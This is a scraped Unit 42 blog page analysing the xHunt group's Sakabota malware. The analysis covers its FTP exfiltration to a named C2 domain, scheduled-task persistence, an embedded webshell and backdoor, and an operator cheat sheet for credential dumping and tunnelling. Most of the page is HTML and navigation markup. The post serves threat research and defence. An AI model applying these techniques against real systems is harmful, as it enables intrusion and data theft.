quit\r\n\r\n&nbsp;\r\n\r\n\r\nFigure 6. Sakabota\u2019s \u2018Passwords\u2019 tab \r\nThe \u2018File MNG\u2019 tab seen in Figure 7 allows the actor to interact directly with the filesystem to create RAR archives of files and folders and to upload specific files to the C2 via FTP. The \u2018RAR\u2019 portion allows the actor to select a folder to archive its files by first saving an embedded \u2018rar.exe\u2019 (SHA256: ea139458b4e88736a3d48e81569178fd5c11156990b6a90e2d35f41b1ad9bac1) to the system as \u201cR.exe\u201d and runs \u2018cd &lt;Read text box&gt; &amp; R.exe a -r -v &lt;Size text box&gt; &lt;Write text box&gt;\u2019. The \u2018FTP\u2019 portion of the tab allows the actor to select files from the system to upload to its C2 server hosted at \u2018pasta58[.]com\u2019 over FTP. Table 3 shows the functionality that the various radio and checkboxes enable if selected in the FTP section. The \u2018B64\u2019 section is meant to allow the actor to base64 encode and decode files on the system; however, it\u2019s functionality does not seem to work appropriately. The dropdown has two options: \u2018CERT\u2019 and \u2018STD\u2019 with the former using the legitimate Microsoft \u2018certutil\u2019 application to encode or decode the file while the latter uses the ToBase64String and FromBase64String methods within the System.Convert class. Neither the \u2018CERT\u2019 and \u2018STD\u2019 options work correctly, with the \u2018STD\u2019 option having the same exact code used for the encode and decode buttons. The \u2018STD\u2019 method is quite interesting, as both the \u2018Encode\u2019 and \u2018Decode\u2019 buttons read the file contents and encode them by calling the ToBase64String method, but then immediately calls FromBase64String on the encoded contents, which effectively results in the cleartext of the file. We are unsure of the purpose of this functionality, as it appears to be a coding error made by the developer.\r\n\r\n\r\n\r\nCheckbox\r\nDescription\r\n\r\n\r\nSYS\r\nWrites paths to selected files to 'List.txt' and creates a scheduled task named 'mytask' to run the Sakabota executable with the '-up-l List.txt'\r\n\r\n\r\nCMD\r\nCreates a scheduled task named 'mytask' to run a batch script \"c:\\FOPO.bat\" that saves FTP commands to 'ftpcmd.dat' to upload the selected files\r\n\r\n\r\nNOR\r\nNormal FTP upload\r\n\r\n\r\nKWF\r\nAbbreviation for \u201cKill When Finished\u201d, which exits the Sakabota application after uploading the files\r\n\r\n\r\nDEL\r\nDeletes the file after uploading\r\n\r\n\r\n\r\nTable 3. Radio and Checkboxes and their functionality in the \u2018FTP\u2019 section of Sakabota\r\n\r\nFigure 7. Sakabota\u2019s \u2018File MNG\u2019 tab \r\nSakabota\u2019s \u2018Resources\u2019 tab seen in Figure 8 has two buttons \u2018Shell\u2019 and \u2018Agent\u2019 that install a webshell and PowerShell backdoor, respectively.\r\n\r\n\r\nFigure 8. Sakabota\u2019s \u2018Resources\u2019 tab\r\nThe webshell is in the Sakabota binary within a resource named \u2018Shell\u2019 (SHA256:\r\nb2fb0da6832e554194b59c817922770af13d474179a1c0381809676ef2709d24) and is meant for the actor to install on an IIS server running ASP.NET, as the webshell was written in C#. By clicking the button, Sakabota will write the embedded Shell to a filenamed \u2018Shell.aspx\u2019, which the actor would then have to move to an IIS directory. The webshell requires authentication before the actor to run commands and upload files to the web server. The authentication process involves checking the MD5 hash of the string in the \u2018id\u2019 parameter of the URL with a hardcoded MD5 hash \u20186242182812353019113116910419137224228\u2019 in the webshell. This authentication process is flawed and cannot work, as the hardcoded MD5 hash is not valid as it contains 37 characters instead of 32, so the actor cannot authenticated to the shell and is therefore unusable in its current form. Figure 9 shows the webshell\u2019s interface, which we had to remove the webshell\u2019s authentication mechanism to display.\r\n\r\n\r\nFigure 9. Interface of webshell embedded within Sakabota\u2019s \u2018Resources\u2019 tab\r\nWhen the actor clicks the Agent button, Sakabota saves an embedded executable from within a resource named svhost to svhost.exe. This executable (SHA256:\r\nffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9) installs a PowerShell based backdoor called CASHY200, which we covered in detail in a previous blog regarding the xHunt campaign.\r\n\r\nThe Web Browser tab seen in Figure 10 is rather interesting, as it does not have any buttons or the ability to actually browse the Internet. It is likely that this tab is an artifact of prior versions of Sakabota, but we are unsure why the developer would have removed the browsing functionality without removing the tab in its entirety.\r\n\r\n\r\nFigure 10. Sakabota\u2019s unsupported web browser tab\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2019\/07\/Adversary-r3d3-150x150.png","width":150,"height":150},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"101775","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=101775' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fxhunt-actors-cheat-sheet%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fxhunt-actors-cheat-sheet%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-101775 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">xHunt Campaign: xHunt Actor’s Cheat Sheet</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-101775 entry-meta">
			
			
			<span class="post-views-count">20,140</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'101775','like')"><i class="ui ui-2"></i><span class="ml-5">11</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 19</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fxhunt-actors-cheat-sheet%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fxhunt-actors-cheat-sheet%2F+-+xHunt+Campaign%3A+xHunt+Actor%E2%80%99s+Cheat+Sheet" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fxhunt-actors-cheat-sheet%2F&title=xHunt+Campaign%3A+xHunt+Actor%E2%80%99s+Cheat+Sheet&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2019-12-05T04:00:17+00:00">December 4, 2019 at 8:00 PM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/credential-harvesting/" rel="tag">Credential Harvesting</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/sakabota/" rel="tag">Sakabota</a>, <a href="https://unit42.paloaltonetworks.com/tag/xhunt/" rel="tag">xHunt</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-900x450.png" class="attachment-single size-single" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-900x450.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-1024x512.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-370x185.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3.png 2001w" sizes="(max-width: 900px) 100vw, 900px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/xhunt-actors-cheat-sheet/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>Unit 42 has been researching the xHunt attack campaign on Kuwaiti organizations for several months. Recently, we found evidence that the developers who created the Sakabota tool, which was <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">previously discussed in the xHunt campaign</a>, had carried out two sets of testing activities in July and August 2018 on Sakabota in an attempt to evade detection. These testing activities involved the developer compiling several variations of the tool with slight changes made to the code base, each of which the developer will submit to online antivirus scanning services to determine the vendors that detect their tool. The name Sakabota appears to be referencing a sword named <a href="https://kenshin.fandom.com/wiki/Sakabat%C5%8D">Sakabato</a> in an anime called “Rurouni Kenshin,” which fits the anime-themed tool names <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">seen in the 2019 XHunt campaign</a>.</p>
<p>While analyzing the Sakabota samples created by the developer in these testing activities, we found a cheat sheet that the developers included within the tool, which we suspect was meant to help the operator of the tool carry out activities on the compromised system and network. This is the first time we’ve seen a malware developer include a cheat sheet of example commands to assist the operator in carrying out the activities on the compromised system and network. We believe the inclusion of this cheat sheet within the tool may suggest that the developer and operator of the Sakabota tool are different individuals.</p>
<p><span style="font-weight: 400;">The cheat sheet includes examples of commands needed for persistence, network reconnaissance, pivoting, credential dumping, general system and network data gathering, as well as data exfiltration and commands to configure the system to allow remote desktop protocol (RDP) sessions. The commands provide insight into the techniques the actors will use after compromising a system, as well as the tools used to achieve their objectives. The commands also suggest that the threat group heavily relies on RDP to interact with compromised hosts, likely using secure shell (SSH) tunnels created with the Plink tool between the infected system and an actor-controlled domain. Also, the command examples show the threat group seeks to move across an infiltrated network to target additional devices, making it a greater threat to organizations once infected. According to these commands, the actor would likely make these pivots to other systems by performing credential dumping from the Windows registry and process memory.</span></p>
<p>Some of the command examples include a domain or IP address, one of which overlaps with a domain that the group used to deliver CASHY200 payloads configured with <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> as its command &amp; control system (C2) that we discussed in <a href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/">our previous blog on xHunt.</a> The cheat sheet also suggests the actors will use scheduled tasks for persistence, which included one scheduled task name that was used for persistence in the previously mentioned CASHY200 payload.</p>
<p>We have provided an analysis of the Sakabota tool, specifically version 1.4, including all of its functionality in the <a href="#Appendix">Appendix</a>.</p>
<h4>Testing Sakabota</h4>
<p>While gathering Sakabota samples during our xHunt research, we came across several samples compiled between July and August 2018, which the developer created during two rounds of testing. The first round of these testing activities occurred on July 21 and 23, 2018, while the second round of testing occurred on August 6 and 7, 2018. Unlike our analysis of testing activities performed by other threat groups, we will provide a higher level synopsis of the activities rather than providing the minute changes made in each iteration.</p>
<p>Both rounds of testing included iterations where the developer either made slight changes to the codebase itself or used different obfuscation tools to see how these changes affected the detection rate of the Sakabota tool. In addition to changes made to the codebase and obfuscators, the developer also modified the embedded resources within the Sakabota tool to determine if they were causing detection as well. Based on the changes between the last sample from the first round on July 23rd and the first sample in the second round of testing on August 6th, we believe the two rounds of testing are one continuous testing activity with a two-week gap between them rather than two separate testing efforts.</p>
